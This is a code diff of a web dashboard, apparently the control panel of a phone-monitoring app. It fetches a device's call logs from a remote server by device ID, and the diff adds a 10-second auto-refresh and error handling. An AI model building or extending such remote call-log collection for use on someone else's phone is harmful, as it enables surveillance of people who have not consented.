@@ -59,7 +59,6 @@
             max-height: 600px; overflow-y: auto; padding-right: 5px;
         }
         
-        /* Scrollbar Styling */
         .log-list::-webkit-scrollbar { width: 5px; }
         .log-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
 
@@ -103,7 +102,6 @@
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
         
-        // --- LOGIC: URL se ID pakadna ---
         const urlParams = new URLSearchParams(window.location.search);
         const DEVICE_ID = urlParams.get('id');
         const storageKey = `calls_${DEVICE_ID}`;
@@ -115,12 +113,16 @@
                 return;
             }
 
-            // 1. Pehle LocalStorage se purana data dikhao
+            // 1. Initial Load
             loadFromStorage();
-
-            // 2. Command bhejo aur naya data lao
             sendCommand();
-            setTimeout(fetchLogs, 3000); 
+            setTimeout(fetchLogs, 2000); 
+
+            // 2. LIVE AUTO REFRESH: Har 10 second mein khud refresh hoga
+            setInterval(() => {
+                console.log("Auto-refreshing logs...");
+                fetchLogs();
+            }, 10000); 
         });
 
         function loadFromStorage() {
@@ -146,24 +148,25 @@
 
         function fetchLogs() {
             const btn = document.getElementById("refreshBtn");
-            btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
+            if(btn) btn.innerHTML = '<i class="fa-solid fa-sync fa-spin"></i>';
 
             fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
                 .then(response => response.json())
                 .then(data => {
                     if (data && data.length > 0) {
-                        // 3. Naya data save aur display karo
                         localStorage.setItem(storageKey, JSON.stringify(data));
                         renderLogs(data);
                     }
                 })
+                .catch(err => console.log("Waiting for server..."))
                 .finally(() => {
-                    btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
+                    if(btn) btn.innerHTML = '<i class="fa-solid fa-rotate"></i>';
                 });
         }
 
         function renderLogs(data) {
             const container = document.getElementById("logsContainer");
+            if(!container) return;
             container.innerHTML = ""; 
 
             data.forEach(log => {
